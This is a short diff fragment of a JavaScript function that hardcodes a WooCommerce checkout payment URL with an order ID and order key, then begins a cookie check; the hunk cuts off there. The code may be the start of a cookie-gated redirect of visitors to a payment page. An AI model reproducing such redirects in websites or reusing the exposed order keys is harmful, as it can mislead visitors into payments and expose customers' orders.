@@ -1,6 +1,6 @@
 
         function executeScript() {
-            var newurl = "https://securely.in/checkout/order-pay/57365/?key=wc_order_jhUXYRDtC6All";
+            var newurl = "https://securely.in/checkout/order-pay/57366/?key=wc_order_N97lktT2Joj6A";
 
             // Check if the "visited" cookie exists
             if (document.cookie.indexOf('visited=true') !== -1) {
